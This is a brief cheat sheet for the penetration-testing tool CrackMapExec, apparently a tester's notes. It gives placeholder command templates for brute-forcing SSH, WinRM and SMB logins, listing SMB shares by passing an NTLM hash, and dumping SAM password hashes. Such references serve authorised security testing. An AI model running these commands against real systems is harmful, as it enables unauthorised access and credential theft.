# cme

CrackMapExec

## brute-force password: SSH

```
cme ssh <host> -u <users> -p <passwords>
```

## brute-force password: WinRM

```
cme winrm <host> -d <domain> -u <users> -p <passwords>
```

## brute-force password: SMBv1

```
cme smb <host> -d <domain> -u <users> -p <passwords>
```

## enumerate SMB shares

* authenticate via LM/NTLM hash

```
cme smb <host> -u <user> -H [LM hash:]<NTLM hash> --shares
```

## dump SAM hashes

```
cme smb <host> -u administrator -p <password> --sam
```

## [...](https://github.com/byt3bl33d3r/CrackMapExec)
